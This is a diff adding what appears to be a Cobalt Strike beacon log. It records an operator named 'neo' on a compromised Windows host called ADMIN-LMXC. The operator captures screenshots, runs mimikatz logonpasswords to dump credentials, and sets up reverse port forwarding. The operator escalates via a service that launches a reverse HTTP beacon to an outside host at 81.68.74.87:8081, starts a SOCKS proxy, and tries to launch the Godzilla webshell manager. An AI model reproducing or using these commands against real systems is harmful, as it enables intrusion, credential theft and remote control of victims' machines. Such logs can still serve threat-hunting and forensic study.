@@ -1,0 +1,47 @@
+11/05 04:58:50 UTC [metadata] 14.134.57.137 <- 172.27.80.1; computer: ADMIN-LMXC; user: admin; process: artifact.exe; pid: 31588; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+11/05 04:58:52 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+11/05 04:58:52 UTC [note] Bid: 839273140  NT: 6.2
+11/05 04:58:56 UTC [checkin] host called home, sent: 16 bytes
+11/05 04:59:16 UTC [input] <neo> screenshot
+11/05 04:59:16 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+11/05 04:59:24 UTC [checkin] host called home, sent: 199779 bytes
+11/05 04:59:25 UTC [input] <neo> logonpasswords
+11/05 04:59:25 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+11/05 05:00:10 UTC [input] <neo> rportfwd 4444 windows/beacon_reverse_tcp
+11/05 05:00:10 UTC [task] <T1090> Tasked beacon to accept TCP Beacon sessions on port 4444
+11/05 05:01:40 UTC [metadata] 14.134.57.137 <- 172.27.80.1; computer: ADMIN-LMXC; user: admin; process: artifact.exe; pid: 31588; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+11/05 05:01:37 UTC [checkin] host called home, sent: 296135 bytes
+11/05 05:01:41 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+11/05 05:01:41 UTC [note] Bid: 839273140  NT: 6.2
+11/05 05:01:51 UTC [output]
+received output:
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+
+11/05 05:02:14 UTC [checkin] host called home, sent: 16 bytes
+11/05 05:03:06 UTC [checkin] host called home, sent: 19 bytes
+11/05 05:04:27 UTC [checkin] host called home, sent: 137 bytes
+11/05 05:05:02 UTC [checkin] host called home, sent: 204 bytes
+11/05 05:05:03 UTC [input] <neo> elevate svc-exe 黎明
+11/05 05:05:04 UTC [task] <T1035, T1050> Tasked beacon to run windows/beacon_http/reverse_http (81.68.74.87:8081) via Service Control Manager (\\127.0.0.1\ADMIN$\9bbe9ed.exe)
+11/05 05:05:04 UTC [indicator] service: \\. 9bbe9ed
+11/05 05:05:04 UTC [indicator] file: 21f5ca7c33d40d4bbada0c82544c4d68 289280 bytes \\127.0.0.1\ADMIN$\9bbe9ed.exe
+11/05 05:05:35 UTC [checkin] host called home, sent: 291382 bytes
+11/05 05:05:37 UTC [error] could not upload file: 2
+11/05 05:05:38 UTC [error] Could not open service control manager on .: 5
+11/05 05:06:10 UTC [checkin] host called home, sent: 20 bytes
+11/05 05:08:49 UTC [checkin] host called home, sent: 91 bytes
+11/05 05:09:05 UTC [input] <neo> socks 43083
+11/05 05:09:05 UTC [output]
+started SOCKS4a server on: 43083
+
+11/05 05:09:19 UTC [checkin] host called home, sent: 60 bytes
+11/05 05:12:22 UTC [checkin] host called home, sent: 67 bytes
+11/05 05:12:42 UTC [input] <neo> execute D:\渗透工具包\Webshell工具\哥斯拉webshell管理工具\godzilla.jar java -jar 
+11/05 05:12:42 UTC [task] <T1106> Tasked beacon to execute: D:\渗透工具包\Webshell工具\哥斯拉webshell管理工具\godzilla.jar java -jar 
+11/05 05:12:42 UTC [checkin] host called home, sent: 81 bytes
+11/05 05:12:42 UTC [error] could not spawn D:\渗透工具包\Webshell工具\哥斯拉webshell管理工具\godzilla.jar java -jar : 193
+11/05 05:13:13 UTC [input] <neo> execute D:\渗透工具包\Webshell工具\哥斯拉webshell管理工具\godzilla.jar java -jar godzilla.jar
+11/05 05:13:13 UTC [task] <T1106> Tasked beacon to execute: D:\渗透工具包\Webshell工具\哥斯拉webshell管理工具\godzilla.jar java -jar godzilla.jar
+11/05 05:13:13 UTC [checkin] host called home, sent: 93 bytes
+11/05 05:13:13 UTC [error] could not spawn D:\渗透工具包\Webshell工具\哥斯拉webshell管理工具\godzilla.jar java -jar godzilla.jar: 193
